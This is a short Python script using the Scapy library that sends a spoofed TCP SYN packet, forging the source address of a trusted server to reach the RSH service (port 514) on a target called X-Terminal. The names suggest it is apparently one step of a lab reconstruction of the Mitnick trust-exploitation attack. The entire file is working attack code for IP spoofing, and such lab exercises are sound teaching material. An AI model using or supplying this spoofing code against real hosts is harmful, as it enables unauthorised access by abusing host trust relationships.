#!/usr/bin/python3
from scapy.all import *
import config

print("Sending Spoofed SYN Packet...")

#Contruct IP Header: impersonate the Trusted Server
ip = IP(src=config.TRUSTED_SERVER_IP, dst=config.X_TERMINAL_IP)

#Contruct TCP Header:
	#sport=1023 is required by RSH protocol
	#dport=514 is the RSH service port on the target
	#flag='S' is the SYN flag
	#seq=... is the arbitrary initial sequence number (ISN)
tcp=TCP(sport=config.TRUSTED_SERVER_PORT, dport=config.X_TERMINAL_PORT, flags='S', seq=778933536)

#Send the packet (the "/" is scapy sintax that incapsulate tcp inside ip)
pkt=ip/tcp 
send(pkt, verbose=0)
print("Spoofed SYN sent.")

